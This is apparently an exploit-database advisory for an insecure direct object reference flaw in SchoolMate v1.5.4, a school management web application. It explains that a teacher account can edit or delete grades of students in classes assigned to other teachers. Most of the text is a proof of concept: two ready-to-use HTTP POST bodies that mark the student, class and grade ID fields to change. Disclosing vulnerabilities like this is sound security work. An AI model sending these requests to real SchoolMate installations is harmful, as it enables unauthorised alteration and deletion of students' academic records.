# Exploit Title: SchoolMate v1.5.4 - Insecure Direct Object Reference(IDOR)
## Date: 4/1/2024
## Vendor Homepage: https://sourceforge.net/projects/schoolmate/files/latest/download
## Tested on: Debian Linux, Apache, Mysql
## Vendor: SchoolMate
## Version: v1.5.4
## Exploit Description:
## SchoolMate v1.5.4 suffers from IDOR - Broken Access Control Vulnerability allowing attacker teacher to edit and delete grade of student who is in other class that is assigned by other teacher(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
POST /index.php HTTP/1.1
...
gradedate=10%2F7%2F2023&points=20&comment=hello+user1&editgrade=1&gradeid=&wasgrade=0.0&wasdate=&student=1(CHANGE HERE)&assignment=1&selectclass=2(CHANGE HERE)&page2=3&date=&logout=&page=2
```

```
POST /index.php HTTP/1.1
...

assignment=1(CHANGE HERE)&delete%5B%5D=1(CHANGE HERE)&addgrade=&deletegrade=1&selectclass=1&selectgrade=1&page2=3&logout=&page=2
```